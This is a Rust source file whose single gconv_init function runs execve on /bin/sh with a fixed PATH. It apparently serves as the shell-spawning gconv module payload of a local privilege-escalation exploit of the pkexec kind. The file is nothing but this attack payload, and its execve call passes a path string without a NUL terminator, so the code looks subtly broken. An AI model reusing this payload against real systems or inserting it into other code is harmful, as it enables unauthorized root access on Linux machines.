use std::ffi::CString;
use std::os::raw::c_char;

fn gconv_init() {
    unsafe {
        let args: Vec<*mut c_char> = vec![CString::new("/bin/sh").expect("[ERR] building CString").into_raw(),
            CString::from_vec_unchecked([0].to_vec()).into_raw()];
        let args: &[*mut c_char] = args.as_ref();

        let mut env_last: Vec<*mut c_char> = vec![CString::from_vec_unchecked([0].to_vec()).into_raw()];
        let env = ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin"];
        let mut env: Vec<*mut c_char> = env.iter()
    .map(|e| CString::new(*e).expect("[ERR] buildng CString").into_raw()).collect();
        env.append(&mut env_last);
        let env: &[*mut c_char] = env.as_ref();

        libc::execve("/bin/sh".as_ptr() as *const i8, 
            args.as_ptr() as *const *const i8, env.as_ptr() as *const *const i8);
    }
}
